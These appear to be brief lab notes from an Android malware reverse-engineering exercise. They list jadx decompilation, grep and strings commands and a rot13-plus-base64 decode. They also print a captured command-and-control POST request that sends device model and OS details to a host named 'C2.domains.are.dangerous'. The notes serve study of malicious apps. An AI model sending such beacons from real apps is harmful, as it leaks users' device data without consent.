Task0
MainActivityKt.Java
jadx --show-bad-code out_task0/resources/classes4.dex -d out_redebug
grep -r "xorDeobfuscate" out_task0/
strings out_task0/resources/classes4.dex | grep -E "[0-9a-fA-F]{10,}"
grep -A 20 "xorDeobfuscate" out_redebug/sources/com/holberton/task1/MainActivityKt.java

Task1
out_task1/sources/com/holberton/task2/MainActivity.java
echo "DmVhMT9gLJyhpl5upzHhMTShM2Ilo3Im" | tr 'A-Za-z' 'N-ZA-Mn-za-m' | base64 -d

POST / HTTP/1.1
Host: C2.domains.are.dangerous
Content-Type: application/json

{"device_model":"SM-G991B","device_manufacturer":"Samsung","android_version":"13","sdk_version":"33"}

Task2
com-sources-holberton-task3